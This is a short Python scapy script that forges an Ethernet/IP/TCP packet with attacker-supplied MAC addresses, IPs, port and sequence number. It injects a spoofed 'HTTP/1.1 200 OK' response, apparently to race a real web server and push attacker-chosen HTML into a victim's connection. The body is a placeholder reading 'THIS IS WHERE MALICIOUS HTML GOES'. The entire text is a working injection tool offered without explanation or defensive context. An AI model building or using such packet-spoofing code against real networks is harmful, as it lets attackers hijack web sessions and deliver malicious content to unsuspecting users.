from scapy.all import *
import sys

mac_src = sys.argv[1]
mac_dst = sys.argv[2]
ip_src = sys.argv[3]
ip_dst = sys.argv[4]
port = int(sys.argv[5])
seq_num = int(sys.argv[6])

eth = Ether(dst=mac_dst, src=mac_src)
ip = IP(src=ip_src, dst=ip_dst, flags="DF")
tcp = TCP(flags="PA", sport=80, dport=port, seq=seq_num, ack=1)
data = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\nTHIS IS WHERE MALICIOUS HTML GOES"
frame = eth/ip/tcp/data

sendp(frame)
